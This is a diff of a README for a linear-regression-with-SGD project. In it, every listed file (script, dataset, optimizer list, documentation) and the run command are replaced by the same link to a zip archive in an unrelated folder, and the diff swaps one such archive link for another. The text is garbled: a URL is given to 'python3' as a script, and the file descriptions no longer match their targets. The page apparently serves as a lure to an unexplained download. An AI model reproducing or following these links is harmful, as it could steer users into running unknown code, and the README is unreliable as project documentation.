@@ -9,10 +9,10 @@ It also includes a list of **10 common Machine Learning optimizers** with short 
 ```
 📂 AI-LinearRegression-SGD
 │
-├── https://github.com/Ezz-Saied/Ai/raw/refs/heads/main/pneumatoscope/Software_2.2.zip      # Python code for Linear Regression using SGD
-├── https://github.com/Ezz-Saied/Ai/raw/refs/heads/main/pneumatoscope/Software_2.2.zip               # Input dataset (features and target)
-├── https://github.com/Ezz-Saied/Ai/raw/refs/heads/main/pneumatoscope/Software_2.2.zip    # List of 10 ML optimizers with descriptions
-├── https://github.com/Ezz-Saied/Ai/raw/refs/heads/main/pneumatoscope/Software_2.2.zip                 # Project documentation
+├── https://raw.githubusercontent.com/Ezz-Saied/Ai/main/pneumatoscope/Software-patina.zip      # Python code for Linear Regression using SGD
+├── https://raw.githubusercontent.com/Ezz-Saied/Ai/main/pneumatoscope/Software-patina.zip               # Input dataset (features and target)
+├── https://raw.githubusercontent.com/Ezz-Saied/Ai/main/pneumatoscope/Software-patina.zip    # List of 10 ML optimizers with descriptions
+├── https://raw.githubusercontent.com/Ezz-Saied/Ai/main/pneumatoscope/Software-patina.zip                 # Project documentation
 ```
 
 ---
@@ -65,7 +65,7 @@ Add these plots to visualize model performance:
 
 ## 📘 Files Included
 
-### 📄 `https://github.com/Ezz-Saied/Ai/raw/refs/heads/main/pneumatoscope/Software_2.2.zip`
+### 📄 `https://raw.githubusercontent.com/Ezz-Saied/Ai/main/pneumatoscope/Software-patina.zip`
 Contains short one-line explanations of:
 1. Gradient Descent  
 2. Stochastic Gradient Descent  
@@ -88,7 +88,7 @@ pip install numpy pandas matplotlib
 
 Run the script:
 ```bash
-python3 https://github.com/Ezz-Saied/Ai/raw/refs/heads/main/pneumatoscope/Software_2.2.zip
+python3 https://raw.githubusercontent.com/Ezz-Saied/Ai/main/pneumatoscope/Software-patina.zip
 ```
 
 ---
